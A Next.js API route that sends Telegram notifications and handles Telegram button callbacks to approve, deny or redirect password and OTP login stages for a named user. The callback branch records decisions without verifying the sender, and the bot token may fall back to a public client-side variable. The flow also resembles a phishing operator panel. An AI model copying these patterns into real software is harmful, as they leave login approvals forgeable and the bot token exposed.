import { NextRequest, NextResponse } from 'next/server'
import { sendTelegramNotification } from '@/lib/telegram'
import { validateTelegramBody, formatZodError } from '@/lib/validators'
import { createApprovalRequest, processApprovalDecision } from '@/lib/approval-webhook'

function getTelegramBotToken() {
  return process.env.TELEGRAM_BOT_TOKEN || process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN
}

export async function POST(request: NextRequest) {
  try {
    let body: unknown
    try {
      body = await request.json()
    } catch {
      return NextResponse.json(
        { success: false, error: 'Invalid JSON body' },
        { status: 400 }
      )
    }

    const callbackQuery = (body as any)?.callback_query
    if (callbackQuery && typeof callbackQuery === 'object') {
      const rawData = String(callbackQuery.data || '')
      const [action, approvalId] = rawData.split(':')

      if (!approvalId || !['approve', 'deny', 'redirect'].includes(action)) {
        return NextResponse.json(
          { success: false, error: 'Invalid Telegram callback payload' },
          { status: 400 }
        )
      }

      const decision = await processApprovalDecision(approvalId, action as 'approve' | 'deny' | 'redirect')

      const botToken = getTelegramBotToken()
      if (!botToken) {
        return NextResponse.json(
          { success: false, error: 'Telegram bot token is not configured' },
          { status: 500 }
        )
      }
      const answerResponse = await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          callback_query_id: callbackQuery.id,
          text: decision.message || 'Decision recorded',
          show_alert: false,
        }),
      })

      const answerResult = await answerResponse.json().catch(() => ({}))

      return NextResponse.json(
        {
          success: true,
          data: {
            approvalId,
            action,
            result: decision,
          },
          telegram: answerResult,
        },
        { status: 200 }
      )
    }

    const validation = validateTelegramBody(body)
    if (!validation.success) {
      return NextResponse.json(
        { success: false, error: formatZodError(validation.error) },
        { status: 400 }
      )
    }
    const { data: payload } = validation

    if (payload.type === 'password_approval' || payload.type === 'otp_approval') {
      const approvalId = String(payload.data.approvalId || '').trim()
      const username = String(payload.data.username || '').trim()
      const stage = payload.type === 'password_approval' ? 'password' : 'otp'

      if (!approvalId || !username) {
        return NextResponse.json(
          { success: false, error: 'Missing approvalId or username for approval request' },
          { status: 400 }
        )
      }

      await createApprovalRequest(username, stage, approvalId)
    }

    const result = await sendTelegramNotification(payload)

    if (result.success) {
      return NextResponse.json({ success: true, result }, { status: 200 })
    }
    const errorMessage =
      'error' in result && typeof result.error === 'string'
        ? result.error
        : 'Failed to send notification'
    return NextResponse.json({ success: false, error: errorMessage }, { status: 500 })
  } catch (error) {
    console.error('Telegram notification error:', error)
    return NextResponse.json(
      { success: false, error: 'Failed to send notification' },
      { status: 500 }
    )
  }
}
